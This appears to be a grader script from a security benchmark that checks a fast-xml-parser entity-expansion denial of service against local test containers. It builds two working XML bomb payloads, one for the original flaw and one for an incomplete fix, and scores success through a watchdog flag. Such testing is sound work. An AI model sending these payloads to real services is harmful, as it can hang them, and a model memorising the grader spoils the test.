#!/usr/bin/env bash
# verify.sh --seed|--residual — fast-xml-parser entity-expansion DoS
# (CVE-2026-26278 seed / CVE-2026-33036 residual).
# Effect = event-loop hang -> watchdog releases the start-injected PCB_FLAG.
# Judge by matching that token to the current RUN_FLAG (wrong/stale override fails).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

CPORT=80
PORT=""
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}";;
  v1) PORT="${PORT_V1_0:-}";;
  v2) PORT="${PORT_V2_0:-}";;
esac
if [[ -z "$PORT" ]]; then
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
fi
if [[ -z "$PORT" ]]; then
  echo "verify: compose port $VERSION:$CPORT failed (need --profile $VERSION)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
WDPORT="${PORT_WATCHDOG_0:-}"
if [[ -z "$WDPORT" ]]; then
  WDPORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port watchdog 8888 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
fi
if [[ -z "$WDPORT" ]]; then
  echo "verify: compose port watchdog:8888 failed (need --profile $VERSION)" >&2
  exit 20
fi
BASE="http://127.0.0.1:${PORT}"
mkdir -p "$WORK_DIR"
PAY="$WORK_DIR/payload.xml"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2026-26278: DOCTYPE entity referenced 2000x. V0(5.3.5) hangs; V1(5.3.6) counts → throws
  "$PY" -c 'open("'"$PAY"'","w").write("<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n<!ENTITY a \"%s\">\n]>\n<r>%s</r>" % ("A"*5000, "&a;"*2000))'
else
  # CVE-2026-33036 incomplete fix: standard-entity loop uncounted on 5.3.6
  "$PY" -c 'open("'"$PAY"'","w").write("<r>" + "&lt;"*120000 + "</r>")'
fi

# Fire the expansion (sync parse wedges the loop; curl timeout is expected on hang).
# Fast response => no hang this shot; still require watchdog token == current RUN_FLAG
# so a leftover/wrong/stale override cannot pass.
if curl -sS -m 3 -X POST "$BASE/parse" -H 'Content-Type: text/xml' \
     --data-binary @"$PAY" >/dev/null 2>&1; then
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
  if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
fi

# Hang path: poll watchdog until start-injected PCB_FLAG is released.
ST=""; FLAG=""
for i in $(seq 1 20); do
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  [[ -n "$FLAG" ]] && break
  sleep 2
done
echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
